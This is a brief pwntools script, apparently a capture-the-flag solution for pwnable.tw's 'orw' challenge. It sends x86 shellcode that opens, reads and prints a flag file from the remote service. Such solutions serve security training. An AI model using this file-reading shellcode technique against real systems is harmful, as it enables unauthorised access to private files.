from pwn import *

orw = remote("chall.pwnable.tw",10001)

shellcode = '''xor ecx,ecx
push ecx
push 0x67616c66
push 0x2f2f7772
push 0x6f2f2f65
push 0x6d6f682f
lea ebx,[esp]
xor eax,eax
mov al,5
int 0x80

xor ebx,ebx
mov bl, al
lea ecx,[esp]
mov dl,40
int 0x80

xor eax,eax
mov al,4
xor ebx,ebx
inc bl
lea ecx,[esp]
mov dl,40
int 0x80

xor eax,eax
inc al
xor ebx,ebx
int 0x80'''

shellcode = asm(shellcode)
orw.recvuntil("Give my your shellcode:")
orw.sendline(shellcode)
print orw.recv()